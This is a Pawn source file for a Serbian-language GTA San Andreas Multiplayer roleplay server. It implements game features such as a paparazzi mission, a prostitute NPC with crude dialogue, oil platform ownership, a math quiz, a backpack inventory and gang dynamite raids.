    if(radiPaparazo[playerid]) {

        if(IsPlayerInAnyVehicle(playerid)) return 0;

        new Float:Poss[3];
        GetActorPos(paparazoTarget[paparazoMeta[playerid]], Poss[0], Poss[1], Poss[2]);

        if(GetPlayerDistanceFromPoint(playerid, Poss[0], Poss[1], Poss[2]) > 20.0) return SendErrorMessage(playerid, "Moras prici blize, ali ne preblizu!");

        if(GetPlayerCameraTargetActor(playerid) != INVALID_ACTOR_ID && GetPlayerCameraTargetActor(playerid) == paparazoTarget[paparazoMeta[playerid]]) {

            SendPaparazoMessage(playerid, "Uspesno slikano! Odnesi sliku na preradu!");

            DisablePlayerCheckpoint(playerid);

            Novi_SetPlayerCheckpoint(playerid, 1030.6400,-1362.8342,13.5734, 3.0);

            //zaustaviPaparazo(playerid);

            return 1;
        }
    }

    return 1;
}

ptask actorTest[500](playerid) {

    if(IsPlayerNPC(playerid)) return 0;
    if(!radiPaparazo[playerid]) return 0;
    if(IsPlayerInAnyVehicle(playerid)) return 0;

    if(GetPlayerAmmo(playerid) <= 0 && GetPlayerWeapon(playerid) == 43) {

        zaustaviPaparazo(playerid);
        
        SendPaparazoMessage( playerid, "Ostao si bez slika, misija neuspesna!" );

        return 1;
    }

    new Float:Poss[3];
    GetActorPos(paparazoTarget[paparazoMeta[playerid]], Poss[0], Poss[1], Poss[2]);

    if(GetPlayerDistanceFromPoint(playerid, Poss[0], Poss[1], Poss[2]) < 10.0) {

        zaustaviPaparazo(playerid);

        SendPaparazoMessage(playerid, "Prisao si previse blizu!");

        return 1;
    }

    return 1;
}

zaustaviPaparazo(playerid) {

    stop paparazoTimer;

    DisablePlayerCheckpoint(playerid);

    radiPaparazo[playerid] = false;
    paparazoMeta[playerid] = 0;

    RemovePlayerWeapon(playerid, 43);

    EnablePlayerCameraTarget(playerid, 0);
    return 1;
}

createPaparazo() {

    paparazoTarget[0] = CreateActor(35, 823.8672,-1341.7079,13.5159,90.1081 );
    paparazoTarget[1] = CreateActor(35, 2142.2036,-1868.3867,13.5469,88.7451 );
    paparazoTarget[2] = CreateActor(35, 594.9052,-1509.7908,15.1961,272.1029 );
    paparazoTarget[3] = CreateActor(35, 651.1296,-1768.1140,13.5314,352.6359 );
    paparazoTarget[4] = CreateActor(35, 1163.4667,-1755.3809,13.6254,270.2736 );
    paparazoTarget[5] = CreateActor(35, 1690.9312,-1972.4097,8.8203,272.3435 );
    paparazoTarget[6] = CreateActor(35, 1926.4880,-2102.0525,13.5823,271.5336 );
    paparazoTarget[7] = CreateActor(35, 2251.9268,-2149.1475,13.5469,312.5726 );
    paparazoTarget[8] = CreateActor(35, 2757.6372,-2123.7888,11.4872,190.7994 );
    paparazoTarget[9] = CreateActor(35, 2861.1250,-1404.2469,11.7344,272.0070 );
    paparazoTarget[10] = CreateActor(35, 2683.5962,-1113.5005,69.4379,355.2002 );
    paparazoTarget[11] = CreateActor(35, 2502.3667,-1129.8103,39.3116,146.7607 );
    paparazoTarget[12] = CreateActor(35, 2393.0369,-1469.6848,24.0000,168.9740 );
    paparazoTarget[13] = CreateActor(35, 2488.7505,-1802.0676,15.7500,36.1907 );
    paparazoTarget[14] = CreateActor(35, 2269.4917,-1695.6376,13.6664,349.7993 );
    paparazoTarget[15] = CreateActor(35, 1722.1172,-1613.0623,13.5469,357.8325 );
    paparazoTarget[16] = CreateActor(35, 1217.6833,-998.2155,34.3680,176.7458 );
    paparazoTarget[17] = CreateActor(35, 762.8778,-951.3668,54.7946,229.9859 );
    paparazoTarget[18] = CreateActor(35, 111.7268,-1514.1710,8.4042,194.5392 );
    paparazoTarget[19] = CreateActor(35, 368.3394,-1787.0684,5.3903,4.5434 );

    return 1;
}

task resetPaparazoActor[10000]() {

    for(new i = 0; i < 20; i++) {

        if(IsValidActor(paparazoTarget[i]))
            DestroyActor(paparazoTarget[i]);
    }

    paparazoTarget[0] = CreateActor(35, 823.8672,-1341.7079,13.5159,90.1081 );
    paparazoTarget[1] = CreateActor(35, 2142.2036,-1868.3867,13.5469,88.7451 );
    paparazoTarget[2] = CreateActor(35, 594.9052,-1509.7908,15.1961,272.1029 );
    paparazoTarget[3] = CreateActor(35, 651.1296,-1768.1140,13.5314,352.6359 );
    paparazoTarget[4] = CreateActor(35, 1163.4667,-1755.3809,13.6254,270.2736 );
    paparazoTarget[5] = CreateActor(35, 1690.9312,-1972.4097,8.8203,272.3435 );
    paparazoTarget[6] = CreateActor(35, 1926.4880,-2102.0525,13.5823,271.5336 );
    paparazoTarget[7] = CreateActor(35, 2251.9268,-2149.1475,13.5469,312.5726 );
    paparazoTarget[8] = CreateActor(35, 2757.6372,-2123.7888,11.4872,190.7994 );
    paparazoTarget[9] = CreateActor(35, 2861.1250,-1404.2469,11.7344,272.0070 );
    paparazoTarget[10] = CreateActor(35, 2683.5962,-1113.5005,69.4379,355.2002 );
    paparazoTarget[11] = CreateActor(35, 2502.3667,-1129.8103,39.3116,146.7607 );
    paparazoTarget[12] = CreateActor(35, 2393.0369,-1469.6848,24.0000,168.9740 );
    paparazoTarget[13] = CreateActor(35, 2488.7505,-1802.0676,15.7500,36.1907 );
    paparazoTarget[14] = CreateActor(35, 2269.4917,-1695.6376,13.6664,349.7993 );
    paparazoTarget[15] = CreateActor(35, 1722.1172,-1613.0623,13.5469,357.8325 );
    paparazoTarget[16] = CreateActor(35, 1217.6833,-998.2155,34.3680,176.7458 );
    paparazoTarget[17] = CreateActor(35, 762.8778,-951.3668,54.7946,229.9859 );
    paparazoTarget[18] = CreateActor(35, 111.7268,-1514.1710,8.4042,194.5392 );
    paparazoTarget[19] = CreateActor(35, 368.3394,-1787.0684,5.3903,4.5434 );

    return 1;
}

CMD:zaustavipaparazo(playerid) {

    if(!radiPaparazo[playerid]) return SendErrorMessage(playerid, "Ne radis paparazo misiju!");

    SendPaparazoMessage(playerid, "Uspesno si zaustavio paparazo misiju!");

    zaustaviPaparazo(playerid);

    return 1;
}

timer paparazoJobCooldown[900000](playerid) {

    zaustaviPaparazo(playerid);

    SendPaparazoMessage(playerid, "Nisi zavrsio paparazo misiju na vreme!");

    return 1;
} 

CMD:promenideonice( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

    new item[ 32 ], cena;
    if( sscanf( params, "s[32]d", item, cena ) ) {
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
        SendUsageMessage( playerid, "/promenideonice [kategorija] [ kolicina ]");
        SendInfoMessage(playerid, "Trenutne min i max cene | MIN : %d | MAX : %d", ServerInfo[cenaDeonicaMIN], ServerInfo[cenaDeonicaMAX]);
        SCM( playerid, BELA, "[Kategorije] min | max");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
        return 1;
    }
    if(cena < 1 || cena > 50000) return SendErrorMessage(playerid, "Ne moze manje od 1 ili vise od 50.000$");
    if( strcmp( item, "min", true ) == 0 ) {
        ServerInfo[cenaDeonicaMIN] = cena;
        SaveServerStats();
        deoniceNewPrice();

        SendInfoMessage(playerid, "Promenio si minimalnu cenu deonica na %d$!", cena);
    }
    else if( strcmp( item, "max", true ) == 0 ) {
        ServerInfo[cenaDeonicaMAX] = cena;
        SaveServerStats();
        deoniceNewPrice();

        SendInfoMessage(playerid, "Promenio si max cenu deonica na %d$!", cena);
    }
    else {
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
        SendUsageMessage( playerid, "/promenideonice [kategorija] [ kolicina ]");
        SCM( playerid, BELA, "[Kategorije] min | max");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
    }
    return 1;
}

isPlayerAFK(playerid) {

    if(antiCheatCS[playerid][AFKMinute] >= 1) return true;
    else return false;
}

CMD:gotoslut(playerid, params[]) {

    new id;
    if(sscanf(params, "d", id)) return SendUsageMessage(playerid, "/gotoslut [id]");
    if(!IsValidDynamicActor(slutActor[id])) return SendErrorMessage(playerid, "Ne postoji!");
    new Float:APos[3];
    GetDynamicActorPos(slutActor[id], APos[0], APos[1], APos[2]);

    SetPlayerPos(playerid, APos[0], APos[1], APos[2]);

    return 1;
}

CMD:slut(playerid) {

    new slutID = getNearestSlut(playerid);
    if(slutID == -1) return SendErrorMessage(playerid, "Nisi blizu nijedne kurve!");

    if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Ne mozes iz vozila!");

    if(slutRadi[slutID]) return SendErrorMessage(playerid, "Kurva je zauzeta!");

    ShowPlayerDialog(playerid, dialog_Slut, DIALOG_STYLE_TABLIST, "Kurva", 
        "Pusenje\t400$\n\
        Lokacija Hangara\t500$\n\
        Lokacija Crnog Trzista\t1.500$\n\
        Fabrika Oruzija\t1.000$\n\
        Bribe Point\t4.000$\n\
        Paket Novca Mafija\t3.000$\n\
        Pranje Prljavog Novca\t2.000$\n\
        Favella Branje\t3.000$\n\
        Favella Prerada\t2.500$\n\
        Favella Prodaja\t1.000$\n", "Potvrdi", "Odustani");

    return 1;
}

timer slutBlowJobTimer[10000](playerid, id) {

    ClearDynamicActorAnimations(slutActor[id]);
    slutRadi[id] = false;

    TogglePlayerControllable(playerid, true);

    ClearAnimations(playerid);

    SCM( playerid, ZUTA, "Kurva : Nadam se da si uzivao srce");

    return 1;
}

task resetSlutPositions[4000]() {

    for(new i = 1; i < MAX_SLUTS; i++) {

        if(IsValidDynamicActor(slutActor[i]) && !slutRadi[i]) {
            SetDynamicActorPos(slutActor[i], slutInfo[i][slutPosX], slutInfo[i][slutPosY], slutInfo[i][slutPosZ]);
        }
    }

    return 1;
}

stock NextNaftnaPlatformaID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), PLATFORMA_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
    return ( id );
}

GetNearestNaftnaPlatforma( playerid ) {

    for( new i = 0; i < MAX_PLATFORMI; i++) {

        if( IsPlayerInRangeOfPoint( playerid, 3.0, NaftaInfo[ i ][ pUlazX ], NaftaInfo[ i ][ pUlazY ], NaftaInfo[ i ][ pUlazZ ] )) { return i; }
    }
    return -1;
}

CMD:kupiplatformu( playerid, params[] ) {
    new id = GetNearestNaftnaPlatforma( playerid );

    if( id == -1 ) return SendErrorMessage( playerid, "U blizini nema nijedna Naftna Platforma." );
    if( PlayerInfo[ playerid ][ xNaftaID ] != -1 ) return SendErrorMessage( playerid, "Vec posedujete jednu naftnu platformu." );
    if( PlayerInfo[ playerid ][ xNovac ] < NAFTNAPLATFORMA_PRICE ) return SendErrorMessage( playerid, "Nemate dovoljno novca (%d$).", NAFTNAPLATFORMA_PRICE);
    if(strcmp( NaftaInfo[id][pVlasnik], "Niko", true )) return SendErrorMessage(playerid, "Ova Naftna Platforma ima vlasnika!");

    DajIgracuNovac( playerid, -NAFTNAPLATFORMA_PRICE );
    PlayerInfo[ playerid ][ xNaftaID ] = id;
    SavePlayer( playerid );

    strmid( NaftaInfo[ id ][ pVlasnik ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME );

    SacuvajNaftnuPlatformu(id);
    NaftaLabelUpdate(id);

    SendInfoMessage( playerid, "Kupili ste Naftnu Platformu za %d$!", NAFTNAPLATFORMA_PRICE);
    return (true);
}

task NaftnaPlatformaWork[3600000]() {

    for( new id = 0; id < MAX_PLATFORMI; id++ ) {

        new filename[ 32 ];
        format( filename, sizeof( filename ), PLATFORMA_FILE, id );

        if( fexist( filename ) ) {

            if(strcmp( NaftaInfo[id][pVlasnik], "Niko", true )) {

                NaftaInfo[id][pNovac] += NAFTNAPLATFORMA_DOBITAK;
                SacuvajNaftnuPlatformu(id);
            }
        }
    }
    return 1;
}

CMD:platforma(playerid) {

    if(PlayerInfo[playerid][xNaftaID] == -1) return SendErrorMessage(playerid, "Ti nemas svoju Naftnu Platformu!");

    new id = GetNearestNaftnaPlatforma(playerid);
    if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijedne Naftne Platforme");

    if(PlayerInfo[playerid][xNaftaID] != id) return SendErrorMessage(playerid, "Nisi blizu svoje naftne platforme!");

    ShowPlayerDialog(playerid, dialog_Nafta, DIALOG_STYLE_LIST, "Naftna Platforma", "Status Kase\nPodigni Novac\nProdaj Drzavi\nProdaj Igracu", D_ODABERI, D_ODUSTANI);
    return 1;
}

task pocniMatematikaKviz[1500000]() {

    matematikaKviz();

    return 1;
}

matematikaKviz() {

    if(matematikaAktivan) {

        va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - ZADATAK] {FFFFFF}Niko nije uspeo da resi zadatak na vreme! Resenje : {FF0000}%d", matematikaRezultat);
    }

    new znak = RandomNew(1, 4);
    if(znak == 1) { //+

        new broj1 = RandomNew(10, 500);
        new broj2 = RandomNew(10, 500);

        matematikaRezultat = broj1 + broj2;
        matematikaAktivan = true;

        va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - ZADATAK] {FFFFFF}Koliko je {FF0000}%d + %d "col_white"?", broj1, broj2);

        return 1;
    }
    else if(znak == 2) {

        new broj1 = RandomNew(150, 500);
        new broj2 = RandomNew(10, 100);

        matematikaRezultat = broj1 - broj2;
        matematikaAktivan = true;

        va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - ZADATAK] {FFFFFF}Koliko je {FF0000}%d - %d "col_white"?", broj1, broj2);

        return 1;
    }
    else if(znak == 3) {

        new broj1 = RandomNew(1, 15);
        new broj2 = RandomNew(1, 15);

        matematikaRezultat = broj1 * broj2;
        matematikaAktivan = true;

        va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - ZADATAK] {FFFFFF}Koliko je {FF0000}%d * %d "col_white"?", broj1, broj2);

        return 1;
    }

    return 1;
}

// isVehicleOccupied(vehicleid) {

//     foreach(Player, i) {

//         if(IsPlayerInVehicle(i, vehicleid))
//             return true;
//     }
//     return false;
// }

Inventory_HasSpace(playerid, item) {

    new slotovi = Inventory_GetSlots(playerid);
    if(IsValidInventoryWeapon(item)) {

        for(new slotic = 0; slotic < slotovi; slotic++) {

            if(PlayerInfo[playerid][xInventory][slotic] == item) {

                return true;
            }
        }
    }
    for(new slotic = 0; slotic < slotovi; slotic++) {

        if(PlayerInfo[playerid][xInventory][slotic] == item && PlayerInfo[playerid][xInventoryAmmo][slotic] < 5) {

            return true;
        }
    }

    new slotID = Inventory_GetNextFreeSlot(playerid);

    if(slotID != -1) return true;
    else return false;
}

Inventory_Add(playerid, item, kolicina) {

    if(IsValidInventoryWeapon(item)) {

        new slotovi = Inventory_GetSlots(playerid);
        for(new slotic = 0; slotic < slotovi; slotic++) {

            if(PlayerInfo[playerid][xInventory][slotic] == item) {

                PlayerInfo[playerid][xInventoryAmmo][slotic] += kolicina;
                SavePlayer(playerid);
                SendInfoMessage(playerid, "Ubacio si %d metkova %s u ranac!", kolicina, Inventory_GetName(playerid, slotic));

                return 1;
            }
        }

        new freeSlot = Inventory_GetNextFreeSlot(playerid);
        if(freeSlot == -1) return SendErrorMessage(playerid, "Nemas mesta u rancu!");

        PlayerInfo[playerid][xInventory][freeSlot] = item;
        PlayerInfo[playerid][xInventoryAmmo][freeSlot] = kolicina;
        SavePlayer(playerid);

        SendInfoMessage(playerid, "Ubacio si %s sa %d metkova u ranac!", Inventory_GetName(playerid, freeSlot), PlayerInfo[playerid][xInventoryAmmo][freeSlot]);

        return 1;
    }

    //Proveri da li ima vec negde hranu
    new slotovi = Inventory_GetSlots(playerid);
    for(new slotNumb = 0; slotNumb < slotovi; slotNumb++) {

        if(PlayerInfo[playerid][xInventory][slotNumb] == item && PlayerInfo[playerid][xInventoryAmmo][slotNumb] < 5) {

            PlayerInfo[playerid][xInventoryAmmo][slotNumb] += kolicina;
            SavePlayer(playerid);
            SendInfoMessage(playerid, "Ubacio si %s u ranac! Sada imas %d/5 !", Inventory_GetName(playerid, slotNumb), PlayerInfo[playerid][xInventoryAmmo][slotNumb]);

            return 1;
        }
    }

    new freeSlot = Inventory_GetNextFreeSlot(playerid);
    if(freeSlot == -1) return SendErrorMessage(playerid, "Nemas mesta u rancu!");

    PlayerInfo[playerid][xInventory][freeSlot] = item;
    PlayerInfo[playerid][xInventoryAmmo][freeSlot] = kolicina;
    SavePlayer(playerid);

    SendInfoMessage(playerid, "Ubacio si %s u ranac!", Inventory_GetName(playerid, freeSlot));

    return 1;
}

stock Inventory_Delete(playerid, slot) {

    PlayerInfo[playerid][xInventory][slot] = 0;
    PlayerInfo[playerid][xInventoryAmmo][slot] = 0;
    SavePlayer(playerid);

    return 1;
}

Inventory_Remove(playerid, slot, kolicinaAmmo) {

    PlayerInfo[playerid][xInventoryAmmo][slot] -= kolicinaAmmo;

    if(PlayerInfo[playerid][xInventoryAmmo][slot] == 0) {

        PlayerInfo[playerid][xInventory][slot] = 0;
    }

    SavePlayer(playerid);

    return 1;
}

Inventory_Take(playerid, slot) {

    if(PlayerInfo[playerid][xInventory][slot] == 0) return SendErrorMessage(playerid, "Ovaj slot je prazan!");

    new itemID = PlayerInfo[playerid][xInventory][slot];
    if(IsValidInventoryWeapon(itemID)) {

        inventorySlot[playerid] = slot;
        SPD(playerid, dialog_RanacIzvadiMetkovi, DIALOG_STYLE_INPUT, "Ranac Izvadi Oruzije", "Unesite koliko zelite metkova da izvadite", "Izvadi", "Odustani");

        return 1;
    }
    else {

        if(itemID == inventoryHamburgerID) {

            if(ItemUseTimer[playerid] != 0) return SendErrorMessage(playerid, "Moras sacekati malo!");

            DodajIgracuHP( playerid, 30 );

            TogglePlayerControllable(playerid, 0);

            if( !IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_RHAND ) ) {
            SetPlayerAttachedObject(playerid, OBJECT_SLOT_RHAND, 2703, 6, 0.078287, 0.019677, -0.001004, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
            SetTimerEx("RemoveAttachedObject", 5000, false, "dd", playerid, OBJECT_SLOT_RHAND );
            }

            Inventory_Remove(playerid, slot, 1);

            ItemUseTimer[playerid] = 180;
            defer ItemUseCountDown(playerid);

            ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1, 0, 0, 0, 0, 5000, 1);
            format( globalstring, sizeof( globalstring ), "%s jede hamburger.", ImeIgraca( playerid ) );
            PorukaRadius(20.0 , playerid, globalstring, LJUBICASTA );
        }
        if(itemID == inventoryPizzaID) {

            if(ItemUseTimer[playerid] != 0) return SendErrorMessage(playerid, "Moras sacekati malo!");

            DodajIgracuHP( playerid, 20 );

            TogglePlayerControllable(playerid, 0);

            if( !IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_RHAND ) ) {
                SetPlayerAttachedObject(playerid, OBJECT_SLOT_RHAND, 2702, 6, 0.173041, 0.049197, 0.056789, 0.000000, 274.166107, 299.057983, 1.000000, 1.000000, 1.000000);
                SetTimerEx( "RemoveAttachedObject", 3000, false, "dd", playerid, OBJECT_SLOT_RHAND );
            }

            Inventory_Remove(playerid, slot, 1);

            ItemUseTimer[playerid] = 180;
            defer ItemUseCountDown(playerid);

            ApplyAnimation( playerid, "FOOD", "EAT_Burger", 4.1, 0, 0, 0, 0, 3000, 1 );
            format( globalstring, sizeof( globalstring ), "%s jede picu.", ImeIgraca( playerid ) );
            PorukaRadius(20.0 , playerid, globalstring, LJUBICASTA );
        }
        if(itemID == inventoryPiletinaID) {

            if(ItemUseTimer[playerid] != 0) return SendErrorMessage(playerid, "Moras sacekati malo!");

            DodajIgracuHP( playerid, 40 );

            Inventory_Remove(playerid, slot, 1);

            ItemUseTimer[playerid] = 180;
            defer ItemUseCountDown(playerid);

            TogglePlayerControllable(playerid, 0);

            if( !IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_RHAND ) ) {
                SetPlayerAttachedObject(playerid, OBJECT_SLOT_RHAND, 2703, 6, 0.078287, 0.019677, -0.001004, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
                SetTimerEx("RemoveAttachedObject", 7000, false, "dd", playerid, OBJECT_SLOT_RHAND );
            }

            ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1, 0, 0, 0, 0, 7000, 1);
            format( globalstring, sizeof( globalstring ), "%s jede piletinu.", ImeIgraca( playerid ) );
            PorukaRadius(20.0 , playerid, globalstring, LJUBICASTA );
        }
        if(itemID == inventorySokID) {

            format( globalstring, sizeof( globalstring ), "* %s pije sok.", ImeIgraca( playerid ) );
            PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );

            Inventory_Remove(playerid, slot, 1);

            SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK );
        }
        if(itemID == inventoryPivoID) {

            new drunklevel = GetPlayerDrunkLevel( playerid );
    
            SetPlayerDrunkLevel( playerid, drunklevel + 200);
            
            if( drunklevel > 2000 ) {
                GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
            }
            format( globalstring, sizeof( globalstring ), "* %s pije pivo.", ImeIgraca( playerid ) );
            PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
            
            Inventory_Remove(playerid, slot, 1);
            
            SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE );
        }

        return 1;
    }
}

Inventory_GetName(playerid, slot) {

    new invID = PlayerInfo[playerid][xInventory][slot];
    new string[64] = "Prazan Slot";

    if(IsValidInventoryWeapon(invID))
        GetWeaponName(invID, string, sizeof(string));

    if(invID == inventoryPizzaID) 
        string = "Pizza";
    if(invID == inventoryHamburgerID) 
        string = "Hamburger";
    if(invID == inventorySokID) 
        string = "Sok";
    if(invID == inventoryPivoID) 
        string = "Pivo";
    if(invID == inventoryPiletinaID) 
        string = "Piletina";

    return string;
}

Inventory_GetNextFreeSlot(playerid) {

    new slotovi = Inventory_GetSlots(playerid);
    new freeSlot;
    for(freeSlot = 0; freeSlot <= slotovi; freeSlot++) {

        if(PlayerInfo[playerid][xInventory][freeSlot] == 0)
            return freeSlot;
    }
    return -1;
}

Inventory_GetSlots(playerid) {

    new slots = -1;
    if(PlayerInfo[playerid][xSkillStamina] == 0) slots = 3;
    else if(PlayerInfo[playerid][xSkillStamina] == 1) slots = 4;
    else if(PlayerInfo[playerid][xSkillStamina] == 2) slots = 5;
    else if(PlayerInfo[playerid][xSkillStamina] == 3) slots = 6;
    else if(PlayerInfo[playerid][xSkillStamina] == 4) slots = 7;
    else if(PlayerInfo[playerid][xSkillStamina] == 5) slots = 8;

    return slots;
}

/////////////////////////////////////////////////////////////////////////////////////////

CMD:ranac(playerid) {

    if(PoliceDuty[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok si policajac na duznosti!");
    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama!" );
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na DM Zoni." );
    if(WARPInfo[ playerid ][ warID ] != -1) return SendErrorMessage(playerid, "Ne mozes to dok si u War-u!");
    if(radiMisiju[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok radis misiju!");
    if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");
    if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u DM Zoni." );
    if( PoliceDuty[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
    if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
    //if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
    if( RadiVojnik{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
    if( RadiSabotazer{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
    if(PubgIgra[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok si u PUBG-u!");

    new string[128], RanacString[3080];
    new maxSlots = Inventory_GetSlots(playerid);

    for(new i = 0; i < maxSlots; i++) {

        if(PlayerInfo[playerid][xInventory][i] == 0) 
            format(string, sizeof(string), "%d) Prazan Slot\n", i+1);
        else 
            format(string, sizeof(string), "%d) %s | Kolicina : %d\n", i+1, Inventory_GetName(playerid, i), PlayerInfo[playerid][xInventoryAmmo][i]);

        strcat(RanacString, string);
    }

    SPD(playerid, dialog_Inventory, DIALOG_STYLE_LIST, "Ranac", RanacString, "Odaberi", "Odustani");

    return 1;
}

CMD:putgun(playerid) {

    new oruzije = GetPlayerWeapon(playerid);
    new ammo = GetPlayerAmmo(playerid);
    if(GetPlayerWeapon(playerid) <= 0) return SendErrorMessage(playerid,"Morate imati oruzje u ruci ako zelite da ga ostavite u ranac!");
    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi bacili oruzje!" );
    if( GetFactionType( playerid ) == ORG_TIP_PD ) return SendErrorMessage( playerid, "PD nema potrebe da koristi ovu komandu." );
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na DM Zoni." );
    if(WARPInfo[ playerid ][ warID ] != -1) return SendErrorMessage(playerid, "Ne mozes to dok si u War-u!");
    if(radiMisiju[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok radis misiju!");
    if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");
    if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u DM Zoni." );
    if( PoliceDuty[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
    if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
    //if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
    if( RadiVojnik{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
    if( RadiSabotazer{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
    if(PubgIgra[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok si u PUBG-u!");

    if(!Inventory_HasSpace(playerid, oruzije)) return SendErrorMessage(playerid, "Nemas mesta u rancu!");

    Inventory_Add(playerid, oruzije, ammo);

    RemovePlayerWeapon(playerid, oruzije);

    return 1;
}

IsValidInventoryWeapon(gunID) {

    if(gunID >= 1 && gunID < 46) return true;
    return false;
}

alias:komplettuning("fulltune");
CMD:komplettuning(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Nisi ovlascen!");
    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Moras biti u vozilu!");

    AddVehicleComponent(GetPlayerVehicleID(playerid),1010);
    AddVehicleComponent(GetPlayerVehicleID(playerid),1087);
    AddVehicleComponent(GetPlayerVehicleID(playerid),1086);
    AddVehicleComponent(GetPlayerVehicleID(playerid),1079);
    PlayerPlaySound(playerid,1133,0.0,0.0,0.0);

    return 1;
}

CMD:probijslabutacku(playerid) {

    if(!ClanIlegalaca(playerid)) return SendErrorMessage(playerid, "Samo clanovi bande/mafije!");
    new org = GetNearestWeakPoint(playerid);
    if(org == -1) return SendErrorMessage(playerid, "Nisi blizu nijedne slabe tacke!");

    if(PlayerInfo[playerid][xClan] == org) return SendErrorMessage(playerid, "Ti si clan ove organizacije!");

    if(PlayerInfo[playerid][xDinamit] == 0) return SendErrorMessage(playerid, "Nemas dinamit!");
    if(OI[org][oSlabaTackaProbijena]) return SendErrorMessage(playerid, "Slaba tacka je vec probijena!");

    new Orga = 0, Protiv = 0;

    foreach( Player, i ) {
        if( PlayerInfo[ i ][ xClan ] == org) Protiv++;

        if( PlayerInfo[i][xClan] == PlayerInfo[playerid][xClan]) Orga++;
    }

    if( GetWeapon( playerid ) >= 22 && GetWeapon( playerid ) <= 40 ) {

        // if( Orga < 3 )  return SendErrorMessage( playerid, "Moras imati bar 3 ljudi iz tvoje organizacije online!" );
        // if( Protiv < 3 )  return SendErrorMessage( playerid, "Mora biti bar 3 clanova iz protivnicke bande online da bi zauzeli njihovu teritoriju." );

        OrgPoruka( org, 0xFFC801C8, "[SLABA TACKA] Druga banda pokusava da probije vasu slabu tacku." );

        defer EksplozijaSlabaTacka(playerid, org);
        PlayerInfo[playerid][xDinamit] --;
        SendInfoMessage(playerid, "Postavio si dinamit, odmakni se!");

        return 1;

    } else return SendErrorMessage(playerid, "Nemas adekvatno oruzije!");
}

timer EksplozijaSlabaTacka[10000](playerid, org) {

    OI[org][oSlabaTackaProbijena] = true;
    CreateExplosion( OI[org][oSlabaTacka][0], OI[org][oSlabaTacka][1], OI[org][oSlabaTacka][2], 12, 2.0);
    SaveOrganization(org);
    SendInfoMessage(playerid, "Uspesno si razneo slabu tacku organizacije %s!", OI[org][oName]);

    return 1;
}

